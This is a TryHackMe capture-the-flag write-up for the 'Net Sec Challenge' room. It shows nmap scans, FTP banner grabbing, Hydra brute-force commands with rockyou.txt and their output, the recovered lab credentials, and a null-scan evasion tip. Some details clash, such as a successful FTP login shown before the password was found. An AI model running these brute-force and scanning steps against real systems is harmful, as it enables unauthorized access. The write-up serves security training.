---
title: "Network Security Challenge"
type: docs
tags:
  - thm
  - linux
  - easy
  - ftp
  - brute-force
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Easy, **Room:** *Net Sec Challenge*

</div>

<div class="callout callout-abstract">

**Approach**

1. Full port sweep, a hidden **FTP** service on a non-standard port (`10021`).
2. Anonymous banner grab confirms `vsFTPd 3.0.3` and a valid username (`eddie`).
3. **Hydra** brute-forces FTP → `eddie:jordan` (and `quinn:andrea`).

</div>

---

## Full Walkthrough

I began by taking a look at the web service running on the target, browsing to http://10.10.180.76:8080/ to see what was actually being served there before turning my attention elsewhere. A follow-up nmap scan against the host gave me a clearer picture of what I was dealing with:

```console
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
```

The web service on 8080 turned out to be little more than a bare Node.js/Express instance, so I widened the scan and found something far more interesting: an FTP service tucked away on the non-standard port 10021. I connected to it directly to see what banner it presented and whether an anonymous or guessable account would get me anywhere:


```console
❯ k1b0r@FR13NDSthm/boxes/Net_Sec_Challenge took 37s 
❯ ftp 10.10.180.76 -p 10021
Connected to 10.10.180.76.
220 (vsFTPd 3.0.3)
Name (10.10.180.76:k1b0r): eddie
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```


The vsFTPd 3.0.3 banner and the fact that the username `eddie` was accepted before the password prompt stopped me told me I had a legitimate account to brute-force against. I put together a small wordlist of candidate usernames and pointed Hydra at the FTP service using rockyou.txt for passwords:


```console
❯ k1b0r@FR13NDSthm/boxes/Net_Sec_Challenge via 🐍 v3.10.1 took 7s 
❯ hydra -L users -P /opt/SecLists/Passwords/rockyou.txt ftp://10.10.180.76 -s 10021 -t 64
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 21:09:19
[DATA] max 64 tasks per 1 server, overall 64 tasks, 28688796 login tries (l:2/p:14344398), ~448263 tries per task
[DATA] attacking ftp://10.10.180.76:10021/
[10021][ftp] host: 10.10.180.76   login: eddie   password: jordan
[STATUS] 14346430.00 tries/min, 14346430 tries in 00:01h, 14342495 to do in 00:01h, 64 active
[STATUS] 7174157.50 tries/min, 14348315 tries in 00:02h, 14340610 to do in 00:02h, 64 active
[STATUS] 4783415.33 tries/min, 14350246 tries in 00:03h, 14338679 to do in 00:03h, 64 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
```console
❯ k1b0r@FR13NDSthm/boxes/Net_Sec_Challenge via 🐍 v3.10.1 took 3m3s 


I ended up cancelling that run partway through, since the target's IP had shifted underneath me (a fairly common occurrence on TryHackMe when a machine resets), so I restarted the attack against the new address instead:


❯ k1b0r@FR13NDSthm/boxes/Net_Sec_Challenge via 🐍 v3.10.1 
❯ hydra -L users -P /opt/SecLists/Passwords/rockyou.txt ftp://10.10.0.245:10021 -t 64
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 21:29:36
[DATA] max 64 tasks per 1 server, overall 64 tasks, 28688796 login tries (l:2/p:14344398), ~448263 tries per task
[DATA] attacking ftp://10.10.0.245:10021/
[10021][ftp] host: 10.10.0.245   login: eddie   password: jordan
[10021][ftp] host: 10.10.0.245   login: quinn   password: andrea
1 of 1 target successfully completed, 2 valid passwords found
[WARNING] Writing restore file because 35 final worker threads did not complete until end.
[ERROR] 35 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```


With two valid FTP credential pairs recovered, `eddie:jordan` and `quinn:andrea`, I still wanted to check the website itself more closely, and since the target sat on TryHackMe's internal 10.10.0.0/16 range, that meant working from the AttackBox rather than my own host in order to actually reach it.

For a quick, stealthier reconnaissance pass I also like to reach for a null scan, `nmap -sN ip`, which sends packets with no flags set at all and can slip past some of the basic stateful filtering that a normal SYN scan would trip.

Between the leaked FTP banner and a straightforward wordlist brute-force, this one folded quickly, an easy but satisfying finish.
